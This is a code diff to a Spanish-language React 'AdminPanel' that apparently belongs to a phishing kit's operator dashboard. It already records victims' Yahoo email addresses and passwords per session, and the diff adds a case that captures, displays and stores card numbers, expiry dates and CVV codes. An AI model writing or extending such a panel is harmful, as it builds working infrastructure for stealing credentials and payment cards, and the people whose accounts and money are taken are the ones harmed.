@@ -392,6 +392,9 @@ export default function AdminPanel() {
             case 'yahoo':
               inputDescription = `Yahoo - Correo: ${inputData.correo || 'N/A'}, Contraseña: ${inputData.contrasena || 'N/A'}`;
               break;
+            case 'datos_tarjeta':
+              inputDescription = `Datos Tarjeta - Número: ${inputData.numeroTarjeta || 'N/A'}, Vencimiento: ${inputData.fechaVencimiento || 'N/A'}, CVV: ${inputData.cvv || 'N/A'}`;
+              break;
             default:
               inputDescription = `Datos de ${tipo}`;
           }
@@ -448,6 +451,14 @@ export default function AdminPanel() {
                 case 'yahoo':
                   updatedSession.correo = inputData.correo;
                   updatedSession.contrasena = inputData.contrasena;
+                  break;
+                case 'datos_tarjeta':
+                  // Guardamos los datos de la tarjeta en la sesión
+                  updatedSession.datosTarjeta = {
+                    numeroTarjeta: inputData.numeroTarjeta,
+                    fechaVencimiento: inputData.fechaVencimiento,
+                    cvv: inputData.cvv
+                  };
                   break;
               }
               
